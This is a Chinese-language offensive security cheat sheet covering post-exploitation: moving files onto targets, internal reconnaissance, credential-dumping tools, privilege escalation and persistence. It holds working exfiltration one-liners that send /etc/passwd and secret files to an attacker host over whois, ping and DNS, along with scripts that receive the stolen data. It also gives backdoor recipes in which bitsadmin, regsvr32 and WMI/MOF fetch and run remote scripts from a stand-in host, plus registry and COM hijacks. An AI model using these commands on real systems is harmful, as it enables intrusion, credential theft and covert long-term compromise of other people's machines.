<p>vbs脚本 </p>
<pre><code>Set args = Wscript.Arguments
Url = &quot;http://domain/file&quot;
dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
xHttp.Open &quot;GET&quot;, Url, False
xHttp.Send
with bStrm
.type = 1 &#39;
.open
.write xHttp.responseBody
.savetofile &quot; C:\%homepath%\file&quot;, 2 &#39;
end with
</code></pre>
<blockquote>
<p>执行 ：cscript test.vbs</p>
</blockquote>
<p>Perl </p>
<pre><code>#!/usr/bin/perl 
use LWP::Simple; 
getstore(&quot;http://domain/file&quot;, &quot;file&quot;);
</code></pre>
<blockquote>
<p>执行：perl test.pl</p>
</blockquote>
<p>Python </p>
<pre><code>#!/usr/bin/python 
import urllib2 
u = urllib2.urlopen(&#39;http://domain/file&#39;) 
localFile = open(&#39;local_file&#39;, &#39;w&#39;) 
localFile.write(u.read()) 
localFile.close()
</code></pre>
<blockquote>
<p>执行：python test.py</p>
</blockquote>
<p>Ruby </p>
<pre><code>#!/usr/bin/ruby
require &#39;net/http&#39;
Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|
r = http.get(&quot;/file&quot;)
open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|
file.write(r.body)
&#125;
&#125;
</code></pre>
<blockquote>
<p>执行：ruby test.rb</p>
</blockquote>
<p>PHP </p>
<pre><code>&lt;?php
$url  = &#39;http://www.example.com/file&#39;;
$path = &#39;/path/to/file&#39;;
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
curl_close($ch);
file_put_contents($path, $data);
?&gt;
</code></pre>
<blockquote>
<p>执行：php test.php</p>
</blockquote>
<p>NC<br>attacker </p>
<pre><code>cat file | nc -l 1234
</code></pre>
<p>target</p>
<pre><code>nc host_ip 1234 &gt; file
</code></pre>
<p>FTP</p>
<pre><code>ftp 127.0.0.1 username password get file exit
</code></pre>
<p>TFTP </p>
<pre><code>tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
</code></pre>
<p>Bitsadmin </p>
<pre><code>bitsadmin /transfer n http://domain/file c:%homepath%file
</code></pre>
<p>Window 文件共享 </p>
<pre><code>net use x: \127.0.0.1\share /user:example.comuserID myPassword
</code></pre>
<p>SCP<br>本地到远程 </p>
<pre><code>scp file user@host.com:/tmp
</code></pre>
<p>远程到本地 </p>
<pre><code>scp user@host.com:/tmp file
</code></pre>
<p>rsync<br>远程rsync服务器中拷贝文件到本地机 </p>
<pre><code>rsync -av root@192.168.78.192::www /databack
</code></pre>
<p>本地机器拷贝文件到远程rsync服务器 </p>
<pre><code>rsync -av /databack root@192.168.78.192::www
</code></pre>
<p>certutil.exe </p>
<pre><code>certutil.exe -urlcache -split -f http://site.com/file
</code></pre>
<p>copy</p>
<pre><code>copy \\IP\ShareName\file.exe file.exe
</code></pre>
<p>WHOIS<br>接收端 Host B：</p>
<pre><code>nc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d 
</code></pre>
<p>发送端 Host A：</p>
<pre><code>whois -h host_ip -p 1337 `cat /etc/passwd | base64`
</code></pre>
<p><a target="_blank" rel="noopener" href="https://twitter.com/mubix/status/1102780436118409216">WHOIS + TAR</a><br>First:  </p>
<pre><code>ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it
</code></pre>
<p>Next</p>
<pre><code>tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits
</code></pre>
<p>Finally</p>
<pre><code>cat files.b64 | tr -d &#39;\r\n&#39; | base64 -d | tar zxv #to get the files out
</code></pre>
<p>PING<br>发送端:</p>
<pre><code>xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
</code></pre>
<p>接收端<code>ping_receiver.py</code>:</p>
<pre><code>import sys

try:
    from scapy.all import *
except:
    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)
    sys.exit(0)


def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            data = pkt[ICMP].load[-4:]
            print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125;&#39;, flush=True, end=&quot;&quot;, sep=&quot;&quot;)

sniff(iface=&quot;eth0&quot;, prn=process_packet)
</code></pre>
<pre><code>python3 ping_receiver.py
</code></pre>
<p>DIG<br>发送端:</p>
<pre><code>xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
</code></pre>
<p>接收端<code>dns_reciver.py</code>:</p>
<pre><code>try:
    from scapy.all import *
except:
    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)

def process_packet(pkt):
    if pkt.haslayer(DNS):
        domain = pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)
        root_domain = domain.split(&#39;.&#39;)[1]
        if root_domain.startswith(&#39;gooogle&#39;):
            print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&#39;, flush=True, end=&#39;&#39;)

sniff(iface=&quot;eth0&quot;, prn=process_packet)
</code></pre>
<pre><code>python3 dns_reciver.py
</code></pre>
<p>… </p>
<h3 id="搭建-HTTP-server"><a href="#搭建-HTTP-server" class="headerlink" title="搭建 HTTP server"></a>搭建 HTTP server</h3><p>python2</p>
<pre><code>python -m SimpleHTTPServer 1337
</code></pre>
<p>python3</p>
<pre><code>python -m http.server 1337
</code></pre>
<p>PHP 5.4+</p>
<pre><code>php -S 0.0.0.0:1337
</code></pre>
<p>ruby</p>
<pre><code>ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&#39;
</code></pre>
<pre><code>ruby -run -e httpd . -p 1337
</code></pre>
<p>Perl</p>
<pre><code>perl -MHTTP::Server::Brick -e &#39;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;&#123;path=&gt;&quot;.&quot;&#125;); $s-&gt;start&#39;
</code></pre>
<pre><code>perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \/(.*) / &#125;)&#39;
</code></pre>
<p>busybox httpd</p>
<pre><code>busybox httpd -f -p 8000
</code></pre>
<h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><h3 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h3><h4 id="1、用户列表"><a href="#1、用户列表" class="headerlink" title="1、用户列表"></a>1、用户列表</h4><p>windows用户列表<br>分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 </p>
<h4 id="2、进程列表"><a href="#2、进程列表" class="headerlink" title="2、进程列表"></a>2、进程列表</h4><p>析杀毒软件&#x2F;安全监控工具等<br>邮件客户端<br>VPN<br>ftp等  </p>
<h4 id="3、服务列表"><a href="#3、服务列表" class="headerlink" title="3、服务列表"></a>3、服务列表</h4><p>与安全防范工具有关服务[判断是否可以手动开关等]<br>存在问题的服务[权限&#x2F;漏洞]</p>
<h4 id="4、端口列表"><a href="#4、端口列表" class="headerlink" title="4、端口列表"></a>4、端口列表</h4><p>开放端口对应的常见服务&#x2F;应用程序[匿名&#x2F;权限&#x2F;漏洞等]<br>利用端口进行信息收集</p>
<h4 id="5、补丁列表"><a href="#5、补丁列表" class="headerlink" title="5、补丁列表"></a>5、补丁列表</h4><p>分析 Windows 补丁<br>第三方软件[Java&#x2F;Oracle&#x2F;Flash 等]漏洞</p>
<h4 id="6、本机共享"><a href="#6、本机共享" class="headerlink" title="6、本机共享"></a>6、本机共享</h4><p>本机共享列表&#x2F;访问权限<br>本机访问的域共享&#x2F;访问权限</p>
<h4 id="7、本用户习惯分析"><a href="#7、本用户习惯分析" class="headerlink" title="7、本用户习惯分析"></a>7、本用户习惯分析</h4><p>历史记录<br>收藏夹<br>文档等 </p>
<h4 id="8、获取当前用户密码工具"><a href="#8、获取当前用户密码工具" class="headerlink" title="8、获取当前用户密码工具"></a>8、获取当前用户密码工具</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>  </li>
<li><a target="_blank" rel="noopener" href="https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64">wce</a>  </li>
<li><a target="_blank" rel="noopener" href="https://github.com/peewpw/Invoke-WCMDump">Invoke-WCMDump  </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/giMini/mimiDbg">mimiDbg  </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></li>
<li><a target="_blank" rel="noopener" href="http://launcher.nirsoft.net/downloads/">nirsoft_package</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">QuarksPwDump</a> <a target="_blank" rel="noopener" href="https://github.com/mcandre/fgdump">fgdump</a></li>
<li>星号查看器等</li>
</ul>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne</a>  </li>
<li><a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">mimipenguin</a></li>
</ul>
<h5 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/hayasec/360SafeBrowsergetpass">360SafeBrowsergetpass</a></li>
</ul>
<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/RcoIl/SharpDecryptPwd">SharpDecryptPwd</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/TideSec/Decrypt_Weblogic_Password">Decrypt_Weblogic_Password</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/jas502n/OA-Seeyou">OA-Seeyou</a></li>
</ul>
<h3 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a>常用端口扫描工具</h5><ul>
<li><a target="_blank" rel="noopener" href="https://nmap.org/">nmap</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/robertdavidgraham/masscan">masscan</a> </li>
<li><a target="_blank" rel="noopener" href="https://github.com/zmap/zmap">zmap</a></li>
<li>s扫描器 </li>
<li>自写脚本等 </li>
<li>NC </li>
<li>…</li>
</ul>
<h4 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a>内网拓扑架构分析</h4><ul>
<li>DMZ</li>
<li>管理网</li>
<li>生产网</li>
<li>测试网</li>
</ul>
<h4 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h4><p>ipconfig:</p>
<pre><code>ipconfig /all ------&gt; 查询本机 IP 段，所在域等
</code></pre>
<p>net:</p>
<pre><code>net user ------&gt; 本机用户列表
net localgroup administrators ------&gt; 本机管理员[通常含有域用户]
net user /domain ------&gt; 查询域用户
net group /domain ------&gt; 查询域里面的工作组
net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组
net localgroup administrators /domain ------&gt; 登录本机的域管理员
net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)
net view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表
net view /domain:domainname
</code></pre>
<p>dsquery </p>
<pre><code>dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain
computers&quot; /domain ------&gt; 列出该域内所有机器名
dsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名
dsquery subnet ------&gt;列出该域内网段划分
dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 
dsquery ou ------&gt;列出该域内组织单位 
dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 
</code></pre>
<h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul>
<li>NETBIOS 信息收集 </li>
<li>SMB 信息收集  </li>
<li>空会话信息收集  </li>
<li>漏洞信息收集等</li>
</ul>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><h4 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h4><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li>使用IFileOperation COM接口</li>
<li>使用Wusa.exe的extract选项</li>
<li>远程注入SHELLCODE 到傀儡进程</li>
<li>DLL劫持，劫持系统的DLL文件</li>
<li>eventvwr.exe and registry hijacking</li>
<li>sdclt.exe</li>
<li>SilentCleanup</li>
<li>wscript.exe</li>
<li>cmstp.exe</li>
<li>修改环境变量，劫持高权限.Net程序</li>
<li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li>
<li>直接提权过UAC</li>
</ul>
<h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC </a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko">Yamabiko </a></li>
<li>…</li>
</ul>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ul>
<li>windows内核漏洞提权</li>
</ul>
<blockquote>
<p>检测类:<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>,<a target="_blank" rel="noopener" href="https://github.com/brianwrf/WinSystemHelper">WinSystemHelper</a>,<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">wesng</a></p>
</blockquote>
<blockquote>
<p>利用类:<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits</a>，<a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot.git">BeRoot</a></p>
</blockquote>
<ul>
<li>服务提权</li>
</ul>
<blockquote>
<p>数据库服务，ftp服务等</p>
</blockquote>
<ul>
<li>WINDOWS错误系统配置 </li>
<li>系统服务的错误权限配置漏洞 </li>
<li>不安全的注册表权限配置 </li>
<li>不安全的文件&#x2F;文件夹权限配置 </li>
<li>计划任务 </li>
<li>任意用户以NT AUTHORITY\SYSTEM权限安装msi </li>
<li>提权脚本</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1">PowerUP</a>,<a target="_blank" rel="noopener" href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></p>
</blockquote>
<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h4><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits </a></p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><pre><code>crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
</code></pre>
<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;
</code></pre>
<p>寻找可利用bin：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a>系统服务的错误权限配置漏洞</h4><pre><code>cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
</code></pre>
<h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件&#x2F;文件夹权限配置"></a>不安全的文件&#x2F;文件夹权限配置</h4><pre><code>cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
</code></pre>
<h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h4><pre><code>grep -i user [filename]
grep -i pass [filename]
grep -C 5 &quot;password&quot; [filename]
find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla
</code></pre>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h3><h4 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h4><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a>1、密码记录工具</h5><p>WinlogonHack<br>WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。<br>键盘记录器<br>安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。<br>NTPass<br>获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。<br>Linux 下 openssh 后门<br>重新编译运行的sshd服务，用于记录用户的登陆密码。</p>
<h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> :<br>存储：</p>
<pre><code>$StaticClass = New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null)
$StaticClass.Name = &#39;Win32_Command&#39;
$StaticClass.Put()
$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)
$StaticClass.Put() 
</code></pre>
<p>读取:</p>
<pre><code>$Payload=([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value
</code></pre>
<p><strong>包含数字签名的PE文件</strong><br>利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名<br><strong>特殊ADS</strong><br>…</p>
<pre><code>type putty.exe &gt; ...:putty.exe
wmic process call create c:\test\ads\...:putty.exe
</code></pre>
<p>特殊COM文件</p>
<pre><code>type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe
wmic process call create \\.\C:\test\ads\COM1:putty.exe
</code></pre>
<p>磁盘根目录</p>
<pre><code>type putty.exe &gt;C:\:putty.exe 
wmic process call create C:\:putty.exe
</code></pre>
<h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run&#x2F;RunOnce Keys"></a>3、Run&#x2F;RunOnce Keys</h5><p>用户级 </p>
<pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
</code></pre>
<p>管理员 </p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
</code></pre>
<h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>
<pre><code>HKLM\SYSTEM\CurrentControlSet\Control\hivelist
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager
</code></pre>
<h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
</code></pre>
<h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a>6、Startup Keys</h5><pre><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
</code></pre>
<h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a>7、Services</h5><p>创建服务 </p>
<pre><code>sc create [ServerName] binPath= BinaryPathName
</code></pre>
<h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects
</code></pre>
<h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
</code></pre>
<h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a>10、文件关联</h5><pre><code>HKEY_LOCAL_MACHINE\Software\Classes
HKEY_CLASSES_ROOT
</code></pre>
<h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a>11、<a target="_blank" rel="noopener" href="http://www.liuhaihua.cn/archives/357579.html">bitsadmin</a></h5><pre><code>bitsadmin /create backdoor
bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe
bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot;
bitsadmin /Resume backdoor
</code></pre>
<h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof "></a>12、<a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">mof </a></h5><pre><code>pragma namespace(&quot;\\\\.\\root\\subscription&quot;) 
instance of __EventFilter as $EventFilter
&#123;
EventNamespace = &quot;Root\\Cimv2&quot;;
Name = &quot;filtP1&quot;;
Query = &quot;Select * From __InstanceModificationEvent &quot;
&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
&quot;And TargetInstance.Second = 1&quot;;
QueryLanguage = &quot;WQL&quot;;
&#125;; 
instance of ActiveScriptEventConsumer as $Consumer
&#123;
Name = &quot;consP1&quot;;
ScriptingEngine = &quot;JScript&quot;;
ScriptText = &quot;GetObject(\&quot;script:https://host.com/test\&quot;)&quot;;
&#125;; 
instance of __FilterToConsumerBinding
&#123;
Consumer = $Consumer;
Filter = $EventFilter;
&#125;;
</code></pre>
<p>管理员执行：</p>
<pre><code>mofcomp test.mof
</code></pre>
<h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a>13、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p>
<pre><code>wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate=&quot;C:\Windows\System32\notepad.exe&quot;
wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;
</code></pre>
<h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a>14、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Userland-registry-hijacking">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p>
<pre><code>function Invoke-ScheduledTaskComHandlerUserTask
&#123;
[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#39;Medium&#39;)]
Param (
[Parameter(Mandatory = $True)]
[ValidateNotNullOrEmpty()]
[String]
$Command,

[Switch]
$Force
)
$ScheduledTaskCommandPath = &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;
if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;
New-Item $ScheduledTaskCommandPath -Force |
New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null
&#125;else&#123;
Write-Verbose &quot;Key already exists, consider using -Force&quot;
exit
&#125;

if (Test-Path $ScheduledTaskCommandPath) &#123;
Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;
&#125;else&#123;
Write-Warning &quot;Failed to create registry key, exiting&quot;
exit
&#125; 
&#125;
Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose
</code></pre>
<h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a>15、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Netsh-persistence">Netsh</a></h5><pre><code>netsh add helper c:\test\netshtest.dll
</code></pre>
<p>后门触发：每次调用netsh</p>
<blockquote>
<p>dll编写:<a target="_blank" rel="noopener" href="https://github.com/outflanknl/NetshHelperBeacon">https://github.com/outflanknl/NetshHelperBeacon</a></p>
</blockquote>
<h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a>16、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims">Shim</a></h5><p>常用方式：<br>InjectDll<br>RedirectShortcut<br>RedirectEXE</p>
<h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a>17、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程<br>使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行<br>工具：<a target="_blank" rel="noopener" href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a><br>工具：<a target="_blank" rel="noopener" href="https://github.com/Yonsm/AheadLib">https://github.com/Yonsm/AheadLib</a></p>
<h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent "></a>18、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)">DoubleAgent </a></h5><p>编写自定义Verifier provider DLL<br>通过Application Verifier进行安装<br>注入到目标进程执行payload<br>每当目标进程启动，均会执行payload，相当于一个自启动的方式<br>POC : <a target="_blank" rel="noopener" href="https://github.com/Cybellum/DoubleAgent">https://github.com/Cybellum/DoubleAgent</a></p>
